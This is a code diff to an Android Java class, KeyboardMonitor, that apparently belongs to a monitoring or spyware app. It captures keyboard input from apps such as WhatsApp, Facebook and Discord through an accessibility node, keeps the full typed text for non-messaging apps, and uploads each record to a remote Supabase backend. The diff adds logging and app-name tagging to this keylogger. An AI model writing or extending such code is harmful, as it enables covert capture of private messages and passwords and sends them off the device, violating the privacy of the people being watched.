@@ -65,8 +65,11 @@ public class KeyboardMonitor {
             
             // Only log if there's actual text
             if (inputText.isEmpty()) {
+                Log.d(TAG, "Skipping empty text input from: " + packageName);
                 return;
             }
+            
+            Log.d(TAG, "Processing keyboard input - Package: " + packageName + ", Text length: " + inputText.length());
             
             // Create activity data
             JSONObject keyboardData = new JSONObject();
@@ -85,6 +88,7 @@ public class KeyboardMonitor {
                 keyboardData.put("inputType", "general");
                 // For non-messaging apps, log full text too
                 keyboardData.put("inputText", inputText);
+                keyboardData.put("appName", getAppName(packageName));
             }
             
             // Try to get additional context from accessibility node
@@ -101,18 +105,18 @@ public class KeyboardMonitor {
                 source.recycle();
             }
             
-            Log.d(TAG, "Keyboard input - App: " + packageName + ", Text length: " + inputText.length());
+            Log.d(TAG, "Logging keyboard input - App: " + packageName + ", Text length: " + inputText.length() + ", Type: " + keyboardData.getString("inputType"));
             
             // Log keyboard activity
             supabaseClient.logActivity(deviceId, "keyboard_input", keyboardData, new SupabaseClient.ApiCallback() {
                 @Override
                 public void onSuccess(String response) {
-                    Log.d(TAG, "Keyboard input logged for: " + packageName);
+                    Log.d(TAG, "✓ Keyboard input logged successfully for: " + packageName);
                 }
                 
                 @Override
                 public void onError(String error) {
-                    Log.e(TAG, "Failed to log keyboard input: " + error);
+                    Log.e(TAG, "✗ Failed to log keyboard input: " + error);
                 }
             });
             
@@ -122,6 +126,7 @@ public class KeyboardMonitor {
     }
     
     private String getAppName(String packageName) {
+        if (packageName == null || packageName.isEmpty()) return "Unknown";
         if (packageName.contains("whatsapp")) return "WhatsApp";
         if (packageName.contains("facebook")) return "Facebook";
         if (packageName.contains("instagram")) return "Instagram";
@@ -133,6 +138,15 @@ public class KeyboardMonitor {
         if (packageName.contains("skype")) return "Skype";
         if (packageName.contains("discord")) return "Discord";
         if (packageName.contains("mms") || packageName.contains("messaging")) return "Messages";
+        
+        // Extract app name from package name (e.g., com.example.app -> app)
+        String[] parts = packageName.split("\\.");
+        if (parts.length > 0) {
+            String lastPart = parts[parts.length - 1];
+            // Capitalize first letter
+            return lastPart.substring(0, 1).toUpperCase() + lastPart.substring(1);
+        }
+        
         return packageName;
     }
     
